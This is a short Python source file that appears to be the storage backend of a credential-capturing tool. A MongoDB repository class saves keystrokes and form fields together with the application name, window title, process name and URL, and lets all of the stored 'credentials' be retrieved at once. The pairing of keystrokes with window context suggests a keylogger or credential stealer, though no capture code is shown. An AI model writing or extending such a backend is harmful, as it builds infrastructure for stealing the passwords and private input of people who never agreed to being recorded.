import datetime
import logging
from typing import Dict, List
from pymongo import MongoClient
from interfaces.credential_repository import ICredentialRepository

logger = logging.getLogger("CredentialServer")

class MongoDBCredentialRepository(ICredentialRepository):
    """MongoDB implementation of ICredentialRepository"""
    
    def __init__(self, connection_string: str, database_name: str, collection_name: str):
        """Initialize MongoDB connection"""
        self.client = MongoClient(connection_string)
        self.db = self.client[database_name]
        self.collection = self.db[collection_name]
        logger.info(f"MongoDB repository initialized with database '{database_name}' and collection '{collection_name}'")
    
    def save_credentials(self, application_info: Dict, form_fields: List[Dict], keystrokes: List[Dict]) -> str:
        """Save credentials to MongoDB"""
        document = {
            "app_name": application_info.get("ApplicationName", "Unknown"),
            "window_title": application_info.get("WindowTitle", "Unknown"),
            "process_name": application_info.get("ProcessName", "Unknown"),
            "url": application_info.get("URL", "Unknown"),
            "timestamp": datetime.datetime.now(),
            "form_fields": form_fields,
            "keystrokes": keystrokes
        }
        
        result = self.collection.insert_one(document)
        logger.info(f"Saved credentials for {application_info.get('ApplicationName', 'Unknown')} with ID {result.inserted_id}")
        return str(result.inserted_id)
    
    def get_credentials_by_app(self, app_name: str) -> List[Dict]:
        """Retrieve credentials by application name"""
        cursor = self.collection.find({"app_name": app_name})
        return list(cursor)
    
    def get_all_credentials(self) -> List[Dict]:
        """Retrieve all stored credentials"""
        cursor = self.collection.find()
        return list(cursor)